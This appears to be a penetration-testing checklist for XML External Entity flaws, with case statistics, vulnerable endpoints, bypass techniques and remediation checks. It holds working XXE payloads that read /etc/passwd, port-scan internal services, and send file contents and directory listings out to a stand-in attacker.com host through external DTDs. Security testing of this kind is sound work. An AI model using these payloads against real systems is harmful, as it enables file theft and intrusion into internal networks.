# XXE (XML External Entity) Testing Checklist
> Derived from 25 real-world vulnerability cases (WooYun 2010-2016)

## Entry Points to Test
| Entry Point | Frequency | Notes |
|-------------|-----------|-------|
| SOAP/WSDL web services | ~35% | Axis2, XFire, CXF endpoints |
| Document upload (DOCX/XLSX) | ~20% | Office XML parsed server-side |
| XML API endpoints | ~20% | REST/SOAP accepting XML input |
| WeChat/messaging API callbacks | ~10% | Third-party integration XML parsing |
| File preview functionality | ~10% | Server-side document rendering |
| XML-RPC endpoints | ~5% | Legacy RPC interfaces |

## Vulnerability Types Observed
| Type | Count | Description |
|------|-------|-------------|
| Blind XXE (OOB) | ~40% | No direct response; exfiltrate via external DTD |
| Direct file read | ~35% | File contents returned in response |
| SSRF via XXE | ~15% | Internal port scanning, service access |
| DoS via entity expansion | ~10% | Billion laughs / recursive entities |

## Common Attack Payloads

### 1. Basic File Read (Direct XXE)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 2. Blind XXE with External DTD (OOB)
**Malicious DTD hosted on attacker server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM
  'http://attacker.com/?data=%file;'>">
%eval;
%send;
```

**Injection payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
```

### 3. Directory Listing via Gopher/File Protocol
```xml
<!ENTITY % a SYSTEM "file:///">
<!ENTITY % b "<!ENTITY &#37; c SYSTEM
  'gopher://attacker.com:80/%a;'>">
%b;
%c;
```

### 4. SSRF via XXE (Port Scanning)
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22/">
]>
<root>&xxe;</root>
```
Response time indicates port state: slow = open, fast = closed.

### 5. DOCX-Based XXE
Decompress .docx, inject entity in `word/document.xml`:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE ANY [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<!-- Reference &xxe; within document body -->
```

## Common Vulnerable Endpoints
```
/services/ServiceName?wsdl          (Axis2/CXF SOAP)
/webservice/services/xxx            (Java web services)
/live800/services/IVerification     (Customer service platforms)
/opes/preview.do                    (Document preview)
/?wsdl                              (WSDL discovery)
/xmlrpc.php                         (XML-RPC)
```

## Bypass Techniques
- **Protocol alternatives**: When `file://` is blocked, try `gopher://`, `php://`, `data://`
- **Parameter entities**: Use `%entity;` instead of `&entity;` for blind XXE
- **Encoding tricks**: UTF-7, UTF-16 encoding to bypass XML filters
- **DOCX/XLSX containers**: Embed XXE in Office XML documents
- **Content-Type override**: Set `Content-Type: application/xml` on SOAP endpoints

## Quick Test Vectors
```
1. Add DOCTYPE with external entity to any XML input
2. Upload crafted DOCX with XXE in word/document.xml
3. Test WSDL endpoints with XML entity injection
4. Use Blind XXE with OOB DTD when no direct response
5. Test SSRF via entity pointing to internal services
6. Check for simplexml_load_string() in PHP (WeChat APIs)
```

## Affected Technologies
| Technology | Cases | Notes |
|------------|-------|-------|
| Java (Axis2, XFire, CXF) | ~50% | SOAP services most vulnerable |
| PHP (simplexml_load_string) | ~20% | WeChat SDK, CMS platforms |
| Java (document processing) | ~15% | DOCX/XLSX preview features |
| .NET (XML parsers) | ~10% | Default parser configurations |
| XML-RPC libraries | ~5% | Legacy RPC implementations |

## Root Causes
| Cause | Frequency |
|-------|-----------|
| Default XML parser allows external entities | Most common |
| No DTD processing restrictions | Very common |
| WeChat SDK sample code using unsafe parser | Common |
| Document preview parsing XML without restrictions | Common |
| Exposed WSDL/SOAP endpoints | Common |

## Remediation Verification
When verifying fixes, confirm:
- External entity processing is disabled in XML parser
- DTD processing is disabled or restricted
- `LIBXML_NOENT` flag is NOT used (PHP)
- `DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` (Java)
